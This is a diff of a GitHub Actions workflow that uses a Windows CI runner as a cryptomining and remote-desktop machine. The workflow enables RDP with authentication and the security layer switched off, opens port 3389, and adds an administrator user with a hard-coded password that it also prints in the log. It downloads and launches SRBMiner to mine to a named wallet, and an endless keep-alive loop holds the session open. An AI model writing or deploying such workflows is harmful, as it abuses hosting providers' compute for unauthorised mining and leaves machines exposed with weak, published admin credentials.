@@ -12,17 +12,17 @@ jobs:
         run: |
           Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections" -Value 0 -Force
           Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name "UserAuthentication" -Value 0 -Force
+          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name "SecurityLayer" -Value 0 -Force
           netsh advfirewall firewall add rule name="RDP-Port" dir=in action=allow protocol=TCP localport=3389
           Restart-Service -Name TermService -Force
 
       - name: Create RDP User
         run: |
-          $password = "P@ssw0rd123!" # You can use your random generator here
+          $password = "P@ssw0rd123!" 
           $securePass = ConvertTo-SecureString $password -AsPlainText -Force
           New-LocalUser -Name "RDP" -Password $securePass -AccountNeverExpires
           Add-LocalGroupMember -Group "Administrators" -Member "RDP"
           Add-LocalGroupMember -Group "Remote Desktop Users" -Member "RDP"
-          echo "TAILSCALE_IP=Pending" >> $env:GITHUB_ENV
 
       - name: Install & Connect Tailscale
         run: |
@@ -35,38 +35,36 @@ jobs:
 
       - name: Download and Setup SRBMiner
         run: |
-          # Fresh download of Windows 64-bit version
           $url = "https://github.com/doktor83/SRBMiner-Multi/releases/download/2.4.7/SRBMiner-Multi-2-4-7-win64.zip"
           Invoke-WebRequest -Uri $url -OutFile "miner.zip"
-          Expand-Archive -Path "miner.zip" -DestinationPath "."
+          Expand-Archive -Path "miner.zip" -DestinationPath "$env:USERPROFILE\Desktop\miner"
           
-          # Move binary to a simple folder name
-          mv SRBMiner-Multi-2-4-7 miner_files
-
-      - name: Create and Run start.bat
-        run: |
-          cd miner_files
-          
-          # Creating the start.bat file exactly as requested
+          # Create the start.bat inside the new folder
           $batContent = @"
           @echo off
+          cd /d "%~dp0"
           SRBMiner-MULTI.exe --algorithm verushash --pool na.luckpool.net:3956 --wallet RRA93CzekuvN6aNV4PBknt87YS6L26mrVD --password x --cpu-threads 0 --disable-gpu
           pause
           "@
-          
-          $batContent | Out-File -FilePath "start.bat" -Encoding ascii
-          
-          # Start the miner in a new background process so the workflow continues
-          Start-Process -FilePath "cmd.exe" -ArgumentList "/c start.bat" -WorkingDirectory "miner_files"
+          $batContent | Out-File -FilePath "$env:USERPROFILE\Desktop\miner\SRBMiner-Multi-2-4-7\start.bat" -Encoding ascii
+
+      - name: Run Miner in Background
+        run: |
+          # Navigate to the folder and launch the batch file
+          # Using 'start' ensures it runs in a separate window visible via RDP
+          cd "$env:USERPROFILE\Desktop\miner\SRBMiner-Multi-2-4-7"
+          Start-Process -FilePath "cmd.exe" -ArgumentList "/c start start.bat"
 
       - name: Maintain RDP Session
         run: |
-          Write-Host "RDP is Ready!"
-          Write-Host "Address: $env:TAILSCALE_IP"
-          Write-Host "User: RDP"
+          $tsIP = & "$env:ProgramFiles\Tailscale\tailscale.exe" ip -4
+          Write-Host "n=== RDP ACCESS READY ==="
+          Write-Host "Address: $tsIP"
+          Write-Host "Username: RDP"
+          Write-Host "Password: P@ssw0rd123!"
+          Write-Host "========================n"
           
-          # Keep-alive loop to maintain the 6-hour+ session
           while ($true) {
-              Write-Host "[$(Get-Date)] Session Active. Miner running in background..."
+              Write-Host "[$(Get-Date)] Runner Active - Use Ctrl+C to stop"
               Start-Sleep -Seconds 300
           }
